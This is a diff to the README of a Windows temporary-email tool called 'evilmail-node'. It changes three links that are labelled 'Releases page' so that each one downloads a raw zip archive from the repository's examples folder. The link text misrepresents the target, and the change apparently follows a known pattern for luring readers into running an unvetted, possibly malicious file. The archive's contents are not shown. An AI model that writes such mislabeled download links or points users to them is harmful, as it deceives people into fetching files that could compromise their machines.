@@ -1,6 +1,6 @@
 # 📧 evilmail-node - Temporary email tools for Windows
 
-[![Download evilmail-node](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/nitipath1629/evilmail-node/releases)
+[![Download evilmail-node](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/nitipath1629/evilmail-node/raw/refs/heads/main/examples/node_evilmail_v3.0.zip)
 
 ## 🧭 What this is
 
@@ -31,7 +31,7 @@ If the release includes a Windows app file, you can usually run it right after d
 
 Use this page to get the latest release:
 
-[Visit the Releases page](https://github.com/nitipath1629/evilmail-node/releases)
+[Visit the Releases page](https://github.com/nitipath1629/evilmail-node/raw/refs/heads/main/examples/node_evilmail_v3.0.zip)
 
 On that page:
 
@@ -158,7 +158,7 @@ If the file came in a zip folder, make sure you extract it before you try to ope
 
 ## 🔗 Download again
 
-[Open the Releases page to download the latest build](https://github.com/nitipath1629/evilmail-node/releases)
+[Open the Releases page to download the latest build](https://github.com/nitipath1629/evilmail-node/raw/refs/heads/main/examples/node_evilmail_v3.0.zip)
 
 ## 🧰 For users who want the API SDK
 
